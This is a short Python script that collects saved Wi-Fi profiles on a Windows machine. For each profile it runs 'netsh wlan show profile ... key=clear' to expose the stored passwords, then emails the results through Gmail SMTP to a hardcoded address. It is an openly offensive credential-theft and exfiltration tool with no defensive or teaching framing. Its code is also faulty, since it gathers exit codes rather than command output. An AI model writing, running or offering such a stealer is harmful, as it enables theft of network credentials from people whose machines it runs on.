import subprocess, smtplib, re


def send_mail(email, passwaord, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, passwaord)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_name_list = re.findall("(?:Profile\s*:\s)(.*)", networks.decode("latin-1"))
# print(network_name_list)

result = ""
for network_name in network_name_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.call(command, shell=True)
    result = result + str(current_result)

send_mail("jacasa6477@nmaller.com", "12345678", result)
# print(result)